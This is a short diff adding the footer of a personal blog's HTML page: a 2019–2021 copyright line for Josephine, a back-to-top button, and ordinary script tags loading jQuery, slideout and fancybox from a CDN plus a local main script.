+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
